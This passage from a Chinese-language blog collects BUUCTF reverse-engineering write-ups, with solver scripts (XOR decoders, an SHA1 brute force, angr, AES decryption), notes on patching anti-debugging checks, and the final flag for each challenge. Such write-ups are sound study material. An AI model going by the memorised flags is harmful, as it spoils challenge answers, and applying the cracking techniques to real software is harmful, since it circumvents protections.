src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DOruga1.png"><br>由这个可以推出地图是一个16*16的空间，长这个样子：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DOruga2.png"><br>看一看它的校验部分：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DOruga3.png"><br>它的v2在校验中就进行了更改，而下一次循环又不会对v2进行回溯，因此它走迷宫的路线会变成直来直去的样子。一直向某个方向走到底直到遇见非空的格子，同时还不能越界，因此路线为:<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DOruga4.png"><br>得到flag：MEWEMEWJMEWJM</p><h2 id="BJDCTF2020-BJD-hamburger-competition"><a href="#BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="[BJDCTF2020]BJD hamburger competition"></a>[BJDCTF2020]BJD hamburger competition</h2><p>下载之后非常懵逼，是一个Unity的游戏，打开Visual Studio发现Unity的游戏使用C#写的，所以我们要在它给的一大坨东西里面找一个C#写的dll文件。发现在BJD hamburger competition_Data\Managed下有一个Assembly-CSharp.dll，使用dnSpy打开它，找到加密部分：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BBJDCTF2020%5DBJDhamburgercompetition1.png"><br>跟踪Md5()，发现它截取了答案的前20位：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BBJDCTF2020%5DBJDhamburgercompetition2.png"><br>写出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;DD01903921EA24941C26A48F2CEC24E0BB0E8CC7&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">10000000000000</span>):</span><br><span class="line">    <span class="keyword">if</span> hashlib.sha1(i.__str__().encode()).hexdigest().upper() == <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + hashlib.md5(i.__str__().encode()).hexdigest().upper()[<span class="number">0</span>:<span class="number">20</span>] + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到flag：B8C37E33DEFDE51CF91E</p><h2 id="特殊的-BASE64"><a href="#特殊的-BASE64" class="headerlink" title="特殊的 BASE64"></a>特殊的 BASE64</h2><p>简单的变表base64，不得不说，C++的逆向代码看起来确实恶心<br>得到flag：Special_Base64_By_Lich</p><h2 id="Zer0pts2020-easy-strcmp"><a href="#Zer0pts2020-easy-strcmp" class="headerlink" title="[Zer0pts2020]easy strcmp"></a>[Zer0pts2020]easy strcmp</h2><p>主函数内只有这些，提交发现这不是正确答案：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BZer0pts2020%5Deasystrcmp1.png"><br>返回去看看init函数有没有进行一些什么操作：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BZer0pts2020%5Deasystrcmp2.png"><br>发现它其实调用了一些函数，只不过是通过直接访问地址的形式调用的，双击funcs_889可以看到：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BZer0pts2020%5Deasystrcmp3.png"><br>它调用了两个函数sub_6E0和函数sub_795，其中第一个没什么卵用，跟进第二个：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BZer0pts2020%5Deasystrcmp4.png"><br>发现这个函数很神奇，将strcmp函数的地址传给了qword_201090，将sub_6EA函数的地址传给了off_201028，双击sub_6EA查看：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BZer0pts2020%5Deasystrcmp5.png"><br>发现sub_6EA对参数做了一通操作，然后返回地址在qword_201090的函数的值，而这个函数恰好就是刚赋完值的strcmp函数。在sub_795函数里将sub_6EA函数的地址传给了off_201028，双击off_201028查看：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BZer0pts2020%5Deasystrcmp6.png"><br>发现off_201028地址上的函数恰好又是strcmp函数。所以主函数里执行strcmp时其实先执行了sub_6EA函数，再执行strcmp函数，可以写出脚本：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> p[<span class="number">99</span>] = <span class="string">&quot;zer0pts&#123;********CENSORED********&#125;&quot;</span>;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> k[<span class="number">4</span>] = &#123;<span class="number">0</span>, <span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">*(<span class="type">long</span> <span class="type">long</span> *)&amp;amp;(p[i * <span class="number">8</span>]) += k[i];</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; p;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>得到flag：l3ts_m4k3_4_DETOUR_t0d4y</p><h2 id="ACTF新生赛2020-Universe-final-answer"><a href="#ACTF新生赛2020-Universe-final-answer" class="headerlink" title="[ACTF新生赛2020]Universe_final_answer"></a>[ACTF新生赛2020]Universe_final_answer</h2><p>是个简单的z3，此题大多数时间用在了z3的安装和调查使用教程，算出key的值之后用IDA动调一下即可：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BACTF%E6%96%B0%E7%94%9F%E8%B5%9B2020%5DUniverse_final_answer1.png"><br>得到flag：F0uRTy_7w@_42</p><h2 id="WUSTCTF2020-level4"><a href="#WUSTCTF2020-level4" class="headerlink" title="[WUSTCTF2020]level4"></a>[WUSTCTF2020]level4</h2><p>这是个算法题，给出二叉树的中序遍历和后序遍历，求先序遍历。有一点神奇的是在IDA里静态或者动调的时候都没有找到它存放这些数据的地方……<br>得到flag：This_IS_A_7reE</p><h2 id="crackMe"><a href="#crackMe" class="headerlink" title="crackMe"></a>crackMe</h2><p>代码逻辑非常清晰，但是代码很长，很恶心：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/crackMe1.png"><br>先后输入用户名和密码，根据用户名在sub_401090()中创建byte_416050[]，在loc_4011A0()中创建Format[]和v4[]，跟进loc_4011A0()会有一个花指令，nop掉之后可以得知Format是正确提示且v3恒等于1，因此需要sub_401830()返回true，跟进sub_401830()：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/crackMe2.png"><br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/crackMe3.png"><br>第一部分将password当成16进制数两两一组分割，存入v14[]。第二部分用v14[]和byte_416050[]创建v16[]，最后再用v16创建v13，进行判断。根据v5&lt;8可以得知v14[]长度为8。在sub_410470()中可以得知v16的值是“dbappsec”。跟进sub_401710()：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/crackMe4.png"><br>虽然它判断了一堆情况，但是v4是用户名“welcomebeijing”的长度，v3最大为8，因此它只会执行else if的内容。将sub_401830()中第二部分内的两次反动调在汇编码中将jz改为jmp绕过，动调得到创建v16时的byte_416050[]的值。要注意在汇编码中，程序将byte_416050[v12+v7]的值传给了v12，再用v12进行异或，所以如果只看伪代码手动生成是不对的。写出脚本：、</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> ans[<span class="number">99</span>] = <span class="string">&quot;dbappsec&quot;</span>;</span><br><span class="line">    <span class="type">char</span> name[<span class="number">99</span>] = <span class="string">&quot;welcomebeijing&quot;</span>;</span><br><span class="line">    <span class="type">int</span> XOR[<span class="number">99</span>] = &#123;<span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0x92</span>, <span class="number">0xE9</span>, <span class="number">0x53</span>, <span class="number">0xE2</span>, <span class="number">0xC4</span>, <span class="number">0xCD</span>&#125;;</span><br><span class="line">    <span class="type">int</span> i, j;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[i] ^= name[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ans[i] ^= XOR[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>, ans[i] &amp;amp; <span class="number">255</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到密码：39d09ffa4cfcc4cc，将程序中所有反动调全部patch掉然后动调检验，或者直接运行程序会看见程序退出证明成功（因为失败会让你继续输入）：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/crackMe5.png"><br>将其md5之后提交显示不正确。百度搜索得知“正确”的解答中并没有分析sub_401710()，得到密码4eb5f3992391a1ae，很明显它不正确：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/crackMe6.png"><br>得到<br>可以通过提交的flag：d2be2981b84f2a905669995873d6a36c<br>可以通过程序的flag：84ab2835640e510eb81f86e0ced4d91c</p><h2 id="网鼎杯-2020-青龙组-signal"><a href="#网鼎杯-2020-青龙组-signal" class="headerlink" title="[网鼎杯 2020 青龙组]signal"></a>[网鼎杯 2020 青龙组]signal</h2><p>这个东西滴加密比较复杂，有一张加密流程表，根据表单内容对输入进行各种赋值、异或、加减乘除。逆过来的话有一定的难度，所以，我决定请出angr：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;signal.exe&#x27;</span>, auto_load_libs = <span class="literal">False</span>)</span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line">s = p.factory.simgr(init_state)</span><br><span class="line">s.explore(find = <span class="number">0x0040179E</span>, avoid = <span class="number">0x00401539</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>得到flag：757515121f3d478<br>超！这angr真nm好用！</p><h2 id="GUET-CTF2019-number-game"><a href="#GUET-CTF2019-number-game" class="headerlink" title="[GUET-CTF2019]number_game"></a>[GUET-CTF2019]number_game</h2><p>很奇妙的一道题：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGUET-CTF2019%5Dnumber_game1.png"><br>不是很能理解为什么sub_400758()返回值明明是个指针，但在其内部却可以把指针变量赋值给整型变量。在sub_400917()内查看矩阵的样子：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGUET-CTF2019%5Dnumber_game2.png"><br>得到flag：1134240024</p><h2 id="findKey"><a href="#findKey" class="headerlink" title="findKey"></a>findKey</h2><p>又一个非常恶心的C++，主函数东西很少，shift+F12找到关键词“flag{}”，双击跟进发现花指令，nop掉：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/findKey1.png"><br>之后进入真正恶心的地方,关注函数sub_40101E：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/findKey2.png"><br>和sub_401005<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/findKey3.png"><br>sub_40101E进去发现：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/findKey4.png"><br>0x8003u是MD5加密的特征值，因此判定整个函数用于MD5。<br>对于第一个sub_401005，就是将那一长串绿色的东西每一位异或‘S’，得到的东西应该为MD5之后的输入，在线解密得到123321。而第二个sub_401005并没有找到v5-492对应的值，猜测就是输入,结果证明我猜对了。附上解密脚本</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> key[<span class="number">99</span>] = &#123;<span class="number">87</span>, <span class="number">94</span>, <span class="number">82</span>, <span class="number">84</span>, <span class="number">73</span>, <span class="number">95</span>, <span class="number">1</span>, <span class="number">109</span>, <span class="number">105</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">110</span>, <span class="number">95</span>, <span class="number">2</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">91</span>, <span class="number">84</span>, <span class="number">76</span>&#125;;</span><br><span class="line">    <span class="type">char</span> ans[<span class="number">99</span>] = <span class="string">&quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    ans[i] ^= <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">char</span>(ans[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    <span class="type">char</span> k[<span class="number">9</span>] = <span class="string">&quot;123321&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">18</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">  key[i] ^= k[i % <span class="number">6</span>];</span><br><span class="line">cout &lt;&lt; <span class="built_in">char</span>(key[i]); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：n0_Zu0_n0_die<br>确实，no zuo no die，没事别碰逆向，这个b又干了我4个小时。</p><h2 id="羊城杯-2020-easyre"><a href="#羊城杯-2020-easyre" class="headerlink" title="[羊城杯 2020]easyre"></a>[羊城杯 2020]easyre</h2><p>这个没啥，就是繁，encodeone进行base64，encodetwo乾坤大挪移，encodethree凯撒，逆过来就行<br>得到flag：672cc4778a38e80cb362987341133ea2</p><h2 id="网鼎杯-2020-青龙组-jocker"><a href="#网鼎杯-2020-青龙组-jocker" class="headerlink" title="[网鼎杯 2020 青龙组]jocker"></a>[网鼎杯 2020 青龙组]jocker</h2><p>打开看见SMC，所以它前面的东西一定是假的，看都不用看。修改完之后得到两个被隐藏的函数encrypt()和Finally()。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker1.png"><br>encrypt()函数逻辑很清晰，用输入去异或Buffer得到unk_403040。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker2.png"><br>但是这个Finally()函数中以time(0)作为种子取随机数，也就是说，你是极大概率得不到出题人当时的情况的。经百度，这里需要你去猜，同样也是异或加密，而且是跟v2异或。<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84%5Djocker3.png"><br>根据猜到的结果写出脚本:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ans[<span class="number">999</span>] = &#123;<span class="number">14</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">19</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">88</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">86</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">62</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">87</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">87</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">13</span>&#125;;</span><br><span class="line">    <span class="type">char</span> XOR1[<span class="number">99</span>] = <span class="string">&quot;hahahaha_do_you_find_me?&quot;</span>;</span><br><span class="line">    <span class="type">char</span> XOR2[<span class="number">99</span>] = <span class="string">&quot;%tp&amp;amp;:&quot;</span>;</span><br><span class="line">    <span class="type">int</span> flag[<span class="number">99</span>], temp;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">19</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = ans[i*<span class="number">4</span>] ^ XOR1[i];</span><br><span class="line">    &#125;</span><br><span class="line">    temp = <span class="string">&#x27;&#125;&#x27;</span> ^ <span class="string">&#x27;:&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i+<span class="number">19</span>] = temp ^ XOR2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag：d07abccf8a410cb37a<br>不是很认可这种本地打不通的题。。。</p><h2 id="FlareOn5-Minesweeper-Championship-Registration"><a href="#FlareOn5-Minesweeper-Championship-Registration" class="headerlink" title="[FlareOn5]Minesweeper Championship Registration"></a>[FlareOn5]Minesweeper Championship Registration</h2><p>是个java的程序，没逆过，但是拖进IDA就能得到flag：<a href="mailto:&#71;&#x6f;&#x6c;&#100;&#101;&#x6e;&#x54;&#x69;&#99;&#x6b;&#x65;&#x74;&#50;&#x30;&#x31;&#56;&#64;&#102;&#x6c;&#x61;&#114;&#101;&#x2d;&#x6f;&#110;&#x2e;&#x63;&#x6f;&#109;">&#71;&#x6f;&#x6c;&#100;&#101;&#x6e;&#x54;&#x69;&#99;&#x6b;&#x65;&#x74;&#50;&#x30;&#x31;&#56;&#64;&#102;&#x6c;&#x61;&#114;&#101;&#x2d;&#x6f;&#110;&#x2e;&#x63;&#x6f;&#109;</a></p><h2 id="firmware"><a href="#firmware" class="headerlink" title="firmware"></a>firmware</h2><p>固件逆向，不想学，看<a href="https://blog.csdn.net/qq_64558075/article/details/122156963">这里</a>吧。<br>得到flag：33a422c45d551ac6e4756f59812a954b</p><h2 id="ACTF新生赛2020-SoulLike"><a href="#ACTF新生赛2020-SoulLike" class="headerlink" title="[ACTF新生赛2020]SoulLike"></a>[ACTF新生赛2020]SoulLike</h2><p>一起来感受3000行屎山代码的美，没有含金量，flag：b0Nf|Re_LiT!</p><h2 id="GWCTF-2019-re3"><a href="#GWCTF-2019-re3" class="headerlink" title="[GWCTF 2019]re3"></a>[GWCTF 2019]re3</h2><p>第一次见，代码自修改问题：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGWCTF2019%5Dre31.png"><br>在file&#x2F;Script command中编写idc脚本：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGWCTF2019%5Dre32.png"><br>转成代码并构造函数，得到被隐藏的内容：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGWCTF2019%5Dre33.png"><br>使用findcrypt插件可以得知sub_400A71()和sub_40196E()和AES加密有关。unk_603170为秘钥。找到生成它的地方：<br><img src="/img/BUUCTF%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B-2/%5BGWCTF2019%5Dre34.png"><br>插件提示sub_401CF9()为md5加密。从伪代码来看秘钥只与第一和第五个md5有关，然而手动生成与动调结果并不一致。写出解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0xBC</span>, <span class="number">0x0A</span>, <span class="number">0xAD</span>, <span class="number">0xC0</span>, <span class="number">0x14</span>, <span class="number">0x7C</span>, <span class="number">0x5E</span>, <span class="number">0xCC</span>, <span class="number">0xE0</span>, <span class="number">0xB1</span>, <span class="number">0x40</span>, <span class="number">0xBC</span>, <span class="number">0x9C</span>, <span class="number">0x51</span>, <span class="number">0xD5</span>, <span class="number">0x2B</span>, <span class="number">0x46</span>, <span class="number">0xB2</span>, <span class="number">0xB9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0xE5</span>, <span class="number">0x32</span>, <span class="number">0x4B</span>, <span class="number">0xAD</span>, <span class="number">0x7F</span>, <span class="number">0xB4</span>, <span class="number">0xB3</span>, <span class="number">0x9C</span>, <span class="number">0xDB</span>, <span class="number">0x4B</span>, <span class="number">0x5B</span>]</span><br><span class="line">k = [<span class="number">0xCB</span>, <span class="number">0x8D</span>, <span class="number">0x49</span>, <span class="number">0x35</span>, <span class="number">0x21</span>, <span class="number">0xB4</span>, <span class="number">0x7A</span>, <span class="number">0x4C</span>, <span class="number">0xC1</span>, <span class="number">0xAE</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x92</span>, <span class="number">0x66</span>, <span class="number">0xCE</span>]</span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    ans += <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(a[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">    key += <span class="string">&quot;&#123;:02x&#125;&quot;</span>.<span class="built_in">format</span>(k[i])</span><br><span class="line">ans = <span class="built_in">int</span>(ans, <span class="number">16</span>)</span><br><span class="line">key = <span class="built_in">int</span>(key, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">aes = AES.new(long_to_bytes(key), mode = AES.MODE_ECB)</span><br><span class="line">flag = aes.decrypt(long_to_bytes(ans))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>得到flag：924a9ab2163d390410d0a1f670</p><h2 id="GXYCTF2019-simple-CPP"><a href="#GXYCTF2019-simple-CPP" class="headerlink" title="[GXYCTF2019]simple 